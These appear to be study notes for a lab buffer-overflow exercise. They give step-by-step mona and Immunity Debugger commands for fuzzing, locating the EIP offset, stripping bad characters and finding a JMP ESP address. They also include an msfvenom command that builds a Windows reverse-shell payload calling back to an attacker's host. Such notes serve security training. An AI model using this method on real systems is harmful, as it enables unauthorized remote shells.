Setup:

Start Immunity Debugger as admin
File > Open
	Select the file you want to test

Make an external Connection to it for testing

Also, configure mona in Immunity Debugger:
	!mona config -set workingfolder c:\mona\%p


Step 1: Spiking
	This is the act of finding a vulnerable command. It is the same as fuzzing, but run against every command on the system

Step 2: Fuzzing
	This is the act of finding the amount of characters you can send before crashing the application

	Set the IP and port in the fuzzing script and then run it.
	This will begin sending increasingly long string s of A's at the target until it crashes. Make note of what value the application crashes at

Step 3: Crashing and Controlling the EIP
	Script exploit.py

	Use metasploit to generate a cyclic pattern 400 bytes longer than whatever you crashed at
		/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <LENGTH>

	Copy the patern and place it in the paylaod variable

	Run exploit.py

	When the server crashes open immunity and paste this command in 
		!mona findmsp -distance <length>

	Grab the offset of EIP

	Update the exploit script and set the offset variable to this value

	Empty the payload and set retn to BBBB

	Run exploit.py again and this time the EIP should be full og 42424242 (representing 4 B's)




Step 3: Finding Bad Characters
	Use the following to generate a byte array in mona:
		!mona bytearray -b "\x00\x2e\xa0\x07"
			It will output to C:\mona\oscp\bytearry.bin

	Now we need a string that is the same as this mona one. 

	Run badChars.py to do this

	Update the payload in exploit.py with the output of this script. Then run exploit.py again
		Take note of the address in the ESP now
			!mona compare -f C:\mona\oscp\bytearray.bin -a 018DFA30

	A popup window should appear labelled "mona Memory comparison results". If not, use the Window menu to switch to it. The window shows the results of the comparison, indicating any characters that are different in memory to what they are in the generated bytearray.bin file.

	Not all of these might be badchars! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string.

	The first badchar in the list should be the null byte (\x00) since we already removed it from the file. Make a note of any others. Generate a new bytearray in mona, specifying these new badchars along with \x00. Then update the payload variable in your exploit.py script and remove the new badchars as well.

	Repeat this process until the final command results in "unmodified"



Step 4: Finding a Jump Point
	
	Update the following command with all the bas characters and then run it
		!mona jmp -r esp -cpb <badchars>
			(RESULTS ARE DISPLAYED IN LOG DATA WINDOW)

	Choose an address and put it in retn in exploit.py. Since this system is little endian, you must supply it backwards (For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.)

Step 5: Generate Payload
	msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -b "<BAD_CHARS>" -f c

	Use this command to generate your payload
	Copy the outputed code into your paylaod variable in exploit.py


Step 6: Prepend NOPS
	padding = "\x90" * 16

		This is needed since an ecoder was used to generate the payload. The payload will need space to unpack. 


Now run the exploit and you should be all good. (Note, you wont get shell till you click into immunity again. Finally, to ensure it worked, start the exe outside immunity and see if you can get a shell)
